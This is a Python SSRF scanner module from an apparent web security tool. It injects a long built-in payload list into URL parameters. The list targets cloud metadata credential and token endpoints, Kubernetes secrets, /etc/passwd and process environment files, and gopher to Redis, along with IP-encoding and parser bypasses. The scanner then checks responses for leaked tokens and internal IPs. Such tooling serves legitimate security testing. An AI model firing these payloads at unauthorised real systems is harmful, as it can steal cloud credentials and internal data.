"""
SSRF (Server-Side Request Forgery) Scanner
Modern 2025 SSRF detection techniques
"""

import logging
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from ..config import Config
from .base import BaseScanner

logger = logging.getLogger(__name__)


class SSRFScanner(BaseScanner):
    """Detect SSRF vulnerabilities"""

    def __init__(
        self, target, payload_file=None, output_file=None, dynamic_payloads=None
    ):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads
        self.findings = []

    def get_payloads(self):
        """Get SSRF payloads - Modern 2025 techniques"""
        default_payloads = [
            # Cloud metadata endpoints (most common 2025)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            # AWS IMDSv2 (2025)
            "http://169.254.169.254/latest/api/token",
            # Google Cloud metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # Digital Ocean
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/user-data",
            # Kubernetes
            "http://kubernetes.default.svc.cluster.local",
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets",
            # Internal network scanning
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://[::]:80",
            "http://0177.0.0.1",  # Octal
            "http://0x7f.0x0.0x0.0x1",  # Hex
            "http://2130706433",  # Decimal (127.0.0.1)
            # Internal IP ranges
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            # Bypass techniques (2025)
            "http://127.1",
            "http://0",
            "http://127.0.1",
            "http://127.00.00.01",
            "http://①②⑦.⓪.⓪.⓪",  # Unicode numbers
            # DNS rebinding
            "http://localtest.me",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            "http://mail.ebc.apple.com",  # Known SSRF
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            "http://www.0177.0.0.1.xip.io",
            # URL parsers bypass (2025)
            "http://127.0.0.1:80\\@www.google.com/",
            "http://www.google.com#@127.0.0.1/",
            "http://127.0.0.1#@www.google.com/",
            # Protocol smuggling
            "dict://127.0.0.1:11211/",
            "gopher://127.0.0.1:25/",
            "gopher://127.0.0.1:6379/_",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "ldap://127.0.0.1",
            "sftp://127.0.0.1",
            "tftp://127.0.0.1",
            # HTTP/HTTPS bypasses
            "https://127.0.0.1",
            "https://localhost",
            "https://[::1]",
            # Port scanning payloads
            "http://127.0.0.1:22",
            "http://127.0.0.1:25",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:9200",  # Elasticsearch
            "http://127.0.0.1:27017",  # MongoDB
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            # Redirect-based SSRF
            "http://redirector.com/?url=http://169.254.169.254/",
            # Cloud function endpoints (2025)
            "http://cloudfunctions.googleapis.com/",
            "http://lambda.amazonaws.com/",
            # Encoding bypasses
            "http://127%2e0%2e0%2e1",
            "http://127%252e0%252e0%252e1",  # Double encoding
            "http://127%C0%A80%C0%A80%C0%A81",
            # IPv6 localhost
            "http://[0:0:0:0:0:0:0:1]",
            "http://[::1]",
            "http://[0000::1]",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            # Localhost alternatives
            "http://localhost.localdomain",
            "http://127.0.0.1.nip.io",
            "http://spoofed.burpcollaborator.net",
            # Java-specific (2025)
            "jar:http://127.0.0.1!/",
            "jar:file:///etc/passwd!/",
            # XXE to SSRF
            "expect://id",
            "php://filter/resource=http://127.0.0.1",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        # Load custom payloads if provided
        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom SSRF payloads")
            except Exception as e:
                logger.error(f"Error loading payload file: {e}")

        return default_payloads

    def extract_parameters(self, url):
        """Extract URL parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def detect_ssrf(self, response, payload):
        """Detect SSRF indicators in response"""
        indicators = []

        # Check for cloud metadata leaks
        cloud_patterns = [
            (r'"Code"\s*:\s*"Success"', "AWS Metadata"),
            (r'"instanceId"\s*:\s*"i-[a-f0-9]+"', "AWS Instance ID"),
            (r'"accountId"\s*:\s*"\d+"', "AWS Account ID"),
            (r"ami-[a-f0-9]+", "AWS AMI"),
            (r'"accessToken"', "Access Token"),
            (r'"project-id"', "GCP Project"),
            (r'"instance-id"', "Instance ID"),
            (r'"hostname".*\.internal"', "Internal Hostname"),
        ]

        for pattern, desc in cloud_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append(desc)

        # Check response time (internal resources respond faster)
        if response.elapsed.total_seconds() < 0.1 and "localhost" in payload.lower():
            indicators.append("Fast internal response")

        # Check for internal IPs in response
        if re.search(
            r"10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2[0-9]|3[01])\.\d+\.\d+",
            response.text,
        ):
            indicators.append("Internal IP leaked")

        return indicators

    def scan(self):
        """Execute SSRF scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper SSRF scanner on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()
        if not payloads:
            print(f"{Config.COLOR_RED}[-] No payloads loaded{Config.COLOR_RESET}")
            return

        print(
            f"{Config.COLOR_GREEN}[+] Loaded {len(payloads)} SSRF payloads{Config.COLOR_RESET}\n"
        )

        params = self.extract_parameters(self.target)
        if not params:
            print(
                f"{Config.COLOR_ORANGE}[-] No parameters found in URL{Config.COLOR_RESET}"
            )
            return

        # Get baseline response
        try:
            baseline = self.make_request(self.target)
        except Exception as e:
            logger.error(f"Error getting baseline: {e}")
            baseline = None

        # Test each parameter with SSRF payloads
        for param_name in params:
            for payload in payloads:
                parsed = urlparse(self.target)
                params_dict = dict(parse_qs(parsed.query))
                params_dict[param_name] = payload

                new_query = urlencode(
                    {
                        k: v[0] if isinstance(v, list) else v
                        for k, v in params_dict.items()
                    }
                )
                test_url = urlunparse(
                    (
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment,
                    )
                )

                try:
                    response = self.make_request(test_url)
                    indicators = self.detect_ssrf(response, payload)

                    if indicators:
                        finding = {
                            "type": "SSRF",
                            "severity": "high",
                            "parameter": param_name,
                            "payload": payload,
                            "indicators": indicators,
                            "url": test_url,
                        }
                        self.findings.append(finding)

                        print(f"{Config.COLOR_RED}[!] SSRF found!{Config.COLOR_RESET}")
                        print(f"    Parameter: {param_name}")
                        print(f"    Payload: {payload}")
                        print(f"    Indicators: {', '.join(indicators)}")
                        logger.warning(f"SSRF found: {param_name} - {payload}")
                    else:
                        print(
                            f"{Config.COLOR_BLUE}[-] No SSRF for payload: {payload[:50]}{Config.COLOR_RESET}"
                        )

                except Exception as e:
                    logger.error(f"Error testing payload {payload}: {e}")

        # Summary
        print(f"\n{Config.COLOR_BLUE}[*] Scan Summary:{Config.COLOR_RESET}")
        if self.findings:
            print(
                f"{Config.COLOR_RED}[!] Found {len(self.findings)} SSRF vulnerabilities!{Config.COLOR_RESET}"
            )
        else:
            print(
                f"{Config.COLOR_GREEN}[-] No SSRF vulnerabilities found{Config.COLOR_RESET}"
            )

        self.save_results()

    def save_results(self):
        """Save findings to file"""
        if self.output_file and self.findings:
            with open(self.output_file, "w") as f:
                f.write(f"SSRF Scan Results for {self.target}\\n")
                f.write("=" * 50 + "\\n\\n")
                for finding in self.findings:
                    f.write(f"Parameter: {finding['parameter']}\\n")
                    f.write(f"Payload: {finding['payload']}\\n")
                    f.write(f"Indicators: {', '.join(finding['indicators'])}\\n")
                    f.write(f"URL: {finding['url']}\\n\\n")
            print(
                f"{Config.COLOR_GREEN}[+] Results saved to {self.output_file}{Config.COLOR_RESET}"
            )
